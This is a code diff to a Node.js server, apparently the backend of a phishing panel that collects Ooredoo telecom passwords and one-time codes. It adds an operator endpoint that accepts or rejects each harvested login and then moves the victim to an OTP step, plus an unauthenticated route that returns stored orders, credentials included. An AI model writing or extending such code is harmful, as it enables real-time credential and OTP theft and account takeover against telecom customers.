@@ -153,6 +153,45 @@ const server = http.createServer(async (req, res) => {
     return json(res, 200, { ok: true, id: order.id });
   }
 
+  if (pathname.startsWith('/api/orders/') && pathname.endsWith('/decision') && req.method === 'POST') {
+    if (!authed(req)) return json(res, 401, { ok: false, error: 'unauthorized' });
+    const id = pathname.split('/').filter(Boolean)[2];
+    const body = await readBody(req);
+    const decision = body.decision === 'accept' ? 'accept' : body.decision === 'reject' ? 'reject' : '';
+    const flow = body.flow === 'otp' ? 'otp' : body.flow === 'login' ? 'login' : 'login';
+    const list = readOrders();
+    const order = list.find((item) => item.id === id);
+
+    if (!order) return json(res, 404, { ok: false, error: 'not-found' });
+
+    order.ooredooDecision = decision;
+    order.ooredooFlow = flow;
+    order.status = decision === 'accept' ? 'pending' : decision === 'reject' ? 'reject' : order.status || 'pending';
+    if (decision === 'accept' && flow === 'login') {
+      order.ooredooFlow = 'otp';
+      order.status = 'pending';
+    } else if (decision === 'accept' && flow === 'otp') {
+      order.ooredooFlow = 'otp';
+      order.status = 'success';
+    } else if (decision === 'reject' && flow === 'otp') {
+      order.ooredooFlow = 'otp';
+      order.status = 'reject';
+    } else if (decision === 'reject' && flow === 'login') {
+      order.ooredooFlow = 'login';
+      order.status = 'reject';
+    }
+    writeOrders(list);
+    return json(res, 200, { ok: true, id: order.id, status: order.status, flow: order.ooredooFlow });
+  }
+
+  if (pathname.startsWith('/api/orders/') && req.method === 'GET') {
+    const id = pathname.split('/').filter(Boolean)[1];
+    const list = readOrders();
+    const order = list.find((item) => item.id === id);
+    if (!order) return json(res, 404, { ok: false, error: 'not-found' });
+    return json(res, 200, { ok: true, order: order });
+  }
+
   // تحديث طلب موجود (مثل بيانات أوريدو عند تسجيل الدخول/OTP)
   if (pathname.startsWith('/api/orders/') && (req.method === 'PUT' || req.method === 'POST')) {
     const id = pathname.split('/').filter(Boolean).slice(1).pop();
@@ -189,6 +228,8 @@ const server = http.createServer(async (req, res) => {
     if (body.ooredooPass) order.ooredooPass = String(body.ooredooPass).slice(0, 200);
     if (body.ooredooOtp) order.ooredooOtp = String(body.ooredooOtp).slice(0, 20);
     if (body.status) order.status = String(body.status).slice(0, 40);
+    if (body.ooredooDecision) order.ooredooDecision = String(body.ooredooDecision).slice(0, 20);
+    if (body.ooredooFlow) order.ooredooFlow = String(body.ooredooFlow).slice(0, 20);
     writeOrders(list);
     return json(res, 200, { ok: true, id: order.id, order: order });
   }
